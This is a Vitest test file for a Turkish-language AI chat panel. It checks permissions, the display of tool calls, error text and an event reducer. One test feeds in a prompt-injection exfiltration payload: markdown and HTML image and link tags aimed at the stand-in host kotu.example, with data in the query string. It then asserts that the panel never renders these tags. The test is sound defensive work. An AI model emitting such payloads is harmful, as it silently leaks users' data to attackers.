import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AiPanel, turaUygula } from "./AiPanel";
import type { AiEvent } from "@/lib/api/ai-chat-client";

// `useSession` gerçek bir `/auth/me` çağrısı yapar; panel testinde oturum yükü
// doğrudan verilir (izin kapısı ve karşılama adı buradan okunur).
const mockSession = vi.hoisted(() => ({
  me: { full_name: "Ahmet Yılmaz", permissions: { ai: "view" } } as unknown,
}));
vi.mock("@/components/shell/SessionProvider", () => ({
  useSession: () => ({ me: mockSession.me, isLoading: false }),
}));

function sse(frames: string[]): Response {
  const encoder = new TextEncoder();
  return new Response(
    new ReadableStream({
      start(controller) {
        for (const f of frames) controller.enqueue(encoder.encode(f));
        controller.close();
      },
    }),
    { status: 200, headers: { "content-type": "text/event-stream" } },
  );
}

async function sor(metin: string) {
  const user = userEvent.setup();
  await user.type(screen.getByLabelText("FİİL AI'ya sorun"), metin);
  await user.click(screen.getByRole("button", { name: "Gönder" }));
}

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  mockSession.me = { full_name: "Ahmet Yılmaz", permissions: { ai: "view" } };
});

describe("AiPanel", () => {
  it("karsilama karti kullanicinin adiyla gorunur", () => {
    render(<AiPanel />);
    expect(screen.getByText(/Merhaba Ahmet Yılmaz!/)).toBeInTheDocument();
  });

  it("ai:none olan rol AccessDenied gorur", () => {
    mockSession.me = { full_name: "X", permissions: { ai: "none" } };
    render(<AiPanel />);
    expect(screen.getByText("Bu alana yetkiniz yok")).toBeInTheDocument();
    expect(screen.queryByLabelText("FİİL AI'ya sorun")).not.toBeInTheDocument();
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 KORKULUK (c) — her araç çağrısı EKRANDA
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 HER arac cagrisi EKRANDA gorunur (arac adi + hal + zarf cumlesi)", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        sse([
          'event: arac_basladi\ndata: {"cagri_id":"c1","arac_adi":"projeleri_listele"}\n\n',
          'event: arac_sonuc\ndata: {"cagri_id":"c1","arac_adi":"projeleri_listele","hal":"Restricted","mesaj":"Bu bilgiyi görme yetkiniz yok (projects). İçerik getirilmedi.","satir_sayisi":null}\n\n',
          'event: metin\ndata: {"metin":"Üç projeniz var."}\n\n',
          'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
        ]),
      ),
    );
    render(<AiPanel />);
    await sor("projelerim");

    const izler = await screen.findAllByTestId("ai-arac-izi");
    expect(izler).toHaveLength(1);
    // Araç adı, hâl etiketi ve zarfın KENDİ cümlesi görünür — modelin
    // yeniden anlattığı hâli değil. Çelişki (model "üç proje" derken zarf
    // "yetkiniz yok" derken) kullanıcıya GÖRÜNÜR kalır.
    expect(izler[0]).toHaveTextContent("projeleri_listele");
    expect(izler[0]).toHaveTextContent("yetkiniz yok");
    expect(izler[0]).toHaveTextContent("İçerik getirilmedi.");
    expect(screen.getByText("Üç projeniz var.")).toBeInTheDocument();
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 SESSİZ EXFİLTRASYON — uzak görsel/bağlantı BASILMAZ
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 model ciktisindan UZAK GORSEL ya da BAGLANTI URETILMEZ", async () => {
    // Zehirlenmiş bir günlük notunun modele ürettirebileceği kaçırma yükü.
    const zehir =
      "![x](https://kotu.example/a.png?d=gizli) <img src=\\\"https://kotu.example/b.png\\\"> [tikla](https://kotu.example) <a href=\\\"https://kotu.example\\\">c</a>";
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        sse([
          `event: metin\ndata: {"metin":"${zehir}"}\n\n`,
          'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
        ]),
      ),
    );
    const { container } = render(<AiPanel />);
    await sor("gunluk ozeti");

    await waitFor(() => expect(container.textContent).toContain("kotu.example"));
    // 🔴 CSP `img-src 'self'` görsel YÜKLENMESİNİ engeller ama İSTEĞİ ENGELLEMEZ:
    // tarayıcı onu kullanıcı tıklamadan atar ve sorgu dizesindeki veri sızar.
    // Tek yapısal çare, böyle bir düğümün HİÇ var olmamasıdır.
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.querySelectorAll("a[href]")).toHaveLength(0);
    // Yük metin olarak GÖRÜNÜR — sessizce yutulmaz, kullanıcı zehri görür.
    expect(container.textContent).toContain("https://kotu.example/a.png");
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 DÜRÜST HATA
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 503'te backend'in DURUST metni basilir, 'sistem hatasi' DEGIL", async () => {
    const detay = "AI sağlayıcısı yapılandırılmadı: `AI_PROVIDER` boş.";
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ detail: detay }), {
          status: 503,
          headers: { "content-type": "application/json" },
        }),
      ),
    );
    render(<AiPanel />);
    await sor("selam");

    expect(await screen.findByText(detay)).toBeInTheDocument();
    expect(screen.queryByText(/sistem hatası/i)).not.toBeInTheDocument();
  });

  it("`hata` karesi (oturum doldu) ayri bir bildirim olarak basilir", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn().mockResolvedValue(
        sse([
          'event: hata\ndata: {"kod":"oturum_suresi_doldu","mesaj":"Oturumunuzun süresi doldu. Bu yetkiniz yok DEMEK DEĞİLDİR."}\n\n',
          'event: tur_bitti\ndata: {"sebep":"kesildi","kullanim":{"girdi":null,"cikti":null}}\n\n',
        ]),
      ),
    );
    render(<AiPanel />);
    await sor("selam");
    expect(await screen.findByText(/Bu yetkiniz yok DEMEK DEĞİLDİR/)).toBeInTheDocument();
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 Kalıcı olmayan yüzeyler SİLİNMEZ, devre dışı basılır
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 sohbet gecmisi ve dosya ekleme SILINMEZ, DEVRE DISI basilir", () => {
    render(<AiPanel />);
    // Mockup'ın geçmiş başlıkları duruyor…
    const gecmis = screen.getByText("Güneşkent Hakedişi").closest("button");
    expect(gecmis).toBeInTheDocument();
    // …ama tıklanamıyor ve sebebi yazıyor.
    expect(gecmis).toBeDisabled();
    expect(gecmis).toHaveAttribute("title", "Kalıcı sohbet geçmişi bu sürümde kapalı.");

    const ek = screen.getByLabelText("Dosya ekle (bu sürümde kapalı)");
    expect(ek).toBeDisabled();
  });

  it("mockup'in dort hizli sorusu ve yasal uyarisi basilir", () => {
    render(<AiPanel />);
    for (const soru of [
      "📊 Bu ayki hakediş özeti",
      "⚠️ Kritik stok uyarıları",
      "💰 Nakit akış durumu",
      "📅 Bu hafta ne planlandı?",
    ]) {
      expect(screen.getByRole("button", { name: soru })).toBeInTheDocument();
    }
    expect(
      screen.getByText(/Yanıtlar yaklaşık olabilir, kritik kararlar için doğrulayın/),
    ).toBeInTheDocument();
  });
});

describe("turaUygula", () => {
  const bos = { soru: "s", metin: "", izler: [], hata: null, reddetme: null, bitti: false };

  it("metin parcalari BIRIKTIRILIR (son parca oncekini ezmez)", () => {
    const a = turaUygula(bos, { tip: "metin", metin: "Mer" });
    const b = turaUygula(a, { tip: "metin", metin: "haba" });
    expect(b.metin).toBe("Merhaba");
  });

  it("arac sonucu DOGRU cagriya baglanir", () => {
    let t = turaUygula(bos, { tip: "arac_basladi", cagri_id: "c1", arac_adi: "a" });
    t = turaUygula(t, { tip: "arac_basladi", cagri_id: "c2", arac_adi: "b" });
    t = turaUygula(t, {
      tip: "arac_sonuc",
      cagri_id: "c2",
      arac_adi: "b",
      hal: "Ok",
      mesaj: "2 kayıt getirildi.",
      satir_sayisi: 2,
    });
    expect(t.izler[0].sonuc).toBeUndefined();
    expect(t.izler[1].sonuc?.hal).toBe("Ok");
  });

  it("bilinmeyen olay turu DEGISTIRMEZ", () => {
    expect(turaUygula(bos, { tip: "arac_arguman", cagri_id: "c1", parca: "{" } as AiEvent)).toEqual(bos);
  });
});
